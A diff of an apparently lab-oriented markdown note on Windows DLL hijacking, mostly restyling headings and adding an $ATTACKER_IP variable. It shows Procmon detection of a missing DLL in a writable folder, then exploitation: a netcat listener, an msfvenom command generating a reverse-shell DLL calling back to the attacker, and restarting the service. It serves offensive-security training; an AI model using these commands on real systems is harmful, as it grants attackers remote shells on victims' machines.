@@ -1,6 +1,9 @@
-# <span style="color:lightblue">DLL Hijacking</span>
+# <span style="color:#FF5555">DLL Hijacking</span>
 
-## <span style="color:lightgreen">Methodology</span>
+> [!info] Variables used below
+> - `$ATTACKER_IP` – your attacking machine's IP
+
+## <span style="color:#8BE9FD">Methodology</span>
 Windows applications usually load DLL files when started. It may happen that a DLL file does not exist and the application is unable to load it. Nevertheless, an application will continue to execute as long as the missing DLL is not needed.  
 In case the application uses a relative and not an absolute file path, Windows searches for the file in the following directories:
 
@@ -12,7 +15,7 @@ In case the application uses a relative and not an absolute file path, Windows s
 -   Directories in the system PATH environment variable
 -   Directories in the user PATH environment variable
 
-### Steps taken to perform DLL hijacking are outlined below.
+### <span style="color:#50FA7B">Steps taken to perform DLL hijacking are outlined below.</span>
 
 1.  Identify vulnerable application and location
 2.  Identify applications PID
@@ -21,9 +24,9 @@ In case the application uses a relative and not an absolute file path, Windows s
 5.  Replace the original DLL with the malicious DLL
 6.  Profit
 
-## <span style="color:lightgreen">Detection</span>
+## <span style="color:#8BE9FD">Detection</span>
 
-###  Windows VM (RDP is required)
+### <span style="color:#50FA7B">Windows VM (RDP is required)</span>
 1. Transfer [Procmon.exe](https://strontic.github.io/xcyclopedia/library/Procmon.exe-EB2A0D7AC44B9B66E884EE5087305ACC.html) on the Windows VM
 2. Right click on `Procmon.exe` and select `'Run as administrator'` from the menu.
 3. In procmon, select `"filter"`.  From the left-most drop down menu, select `'Process Name'`.
@@ -45,9 +48,9 @@ C:\Temp> sc start dllsvc
 10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute `'C:\Temp\hijackme.dll'` yet it could not do that as the file was not found. Note that `'C:\Temp'` is a writable location.
 ![image](https://user-images.githubusercontent.com/59029171/161053920-4af50faa-c6ec-487e-9ec5-142907940e3c.png)
 
-## <span style="color:lightgreen">Exploitation</span>
+## <span style="color:#8BE9FD">Exploitation</span>
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Start a netcat listener
 ```console
@@ -56,12 +59,12 @@ $ sudo nc -nvlp 53
 
 2. Open an additional command prompt and type: 
 ```console
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f dll -o hijackme.dll
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=53 -f dll -o hijackme.dll
 ```
 
 3. Copy the generated file `hijackme.dll`, to the Windows VM.
 
-### Windows VM
+### <span style="color:#50FA7B">Windows VM</span>
 
 1. Place `hijackme.dll` in` 'C:\Temp'`
 2. Open command prompt and type: 
@@ -69,7 +72,7 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f dll -o h
 C:\Temp> sc stop dllsvc & sc start dllsvc
 ```
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Wait for a reverse shell on your kali machine.
 
